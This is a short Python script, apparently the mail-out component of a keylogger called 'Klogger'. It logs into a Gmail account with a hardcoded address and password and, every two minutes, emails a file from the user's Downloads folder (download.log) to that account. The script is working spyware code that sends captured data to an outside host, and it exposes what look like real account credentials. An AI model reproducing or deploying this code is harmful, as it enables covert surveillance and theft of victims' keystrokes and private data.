import yagmail
from apscheduler.schedulers.blocking import BlockingScheduler
import os.path

homedir = os.path.expanduser("~")
homedir = homedir + "/Downloads/download.log"

sender_email = "kloggertest42069@gmail.com"
receiver_email = "kloggertest42069@gmail.com"
subject = "Klogger"
sender_password = "rotkiv1234"

yag = yagmail.SMTP(user=sender_email, password=sender_password)

sched = BlockingScheduler()

contents = [
  "Klogger of the day"
]

log = homedir

@sched.scheduled_job('interval', minutes=2)
def timed_job():    
    yag.send(receiver_email, subject, contents, attachments=log )

sched.start()